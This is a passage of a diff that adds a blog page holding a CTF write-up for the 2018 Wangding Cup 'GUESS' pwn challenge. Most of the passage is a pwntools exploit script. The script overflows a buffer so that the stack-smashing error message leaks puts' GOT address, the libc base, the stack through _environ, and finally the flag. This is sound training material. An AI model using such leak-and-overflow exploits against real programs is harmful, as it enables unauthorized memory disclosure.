+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">file</span> <span class="o">=</span> <span class="s1">&#39;./GUESS&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x128</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Please type your guessing flag</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;***: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;puts addr = &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc_base = &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">environ_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_environ&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;environ addr = &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x128</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">environ_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;flag</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;***: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;stack = &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x128</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0x168</span><span class="p">)</span> <span class="c1"># 是否开启aslr都可</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># payload = &#39;a&#39;*0x128 + p64(environ_addr+0x822a528) # aslr 未开启可用此payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;flag</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;***: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>参考：</strong><a href="https://github.com/lhc328/pwn/blob/master/2018%20%E7%BD%91%E9%BC%8E%E6%9D%AF%20pwn--GUESS.md"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/lhc328/pwn/blob/master/2018%20%E7%BD%91%E9%BC%8E%E6%9D%AF%20pwn&ndash;GUESS.md</a></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2023-10-15 21:47:44">Updated on 2023-10-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/" data-title="2018 网鼎杯-GUESS" data-hashtags="Binary,PWN"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/" data-hashtag="Binary"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/" data-title="2018 网鼎杯-GUESS"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/binary/" class="post-tag" title="Tags - Binary">Binary</a><a href="/tags/pwn/" class="post-tag" title="Tags - PWN">PWN</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/2022%E5%BC%BA%E7%BD%91%E6%9D%AF-devnull/" class="post-nav-item" rel="prev" title="2022 强网杯-Devnull"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>2022 强网杯-Devnull</a><a href="/posts/cactisql%E6%B3%A8%E5%85%A5-cve-2023-49085/" class="post-nav-item" rel="next" title="Cacti SQL注入 CVE-2023-49085">Cacti SQL注入 CVE-2023-49085<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.141.0">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.16">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">xiaole</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1000},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
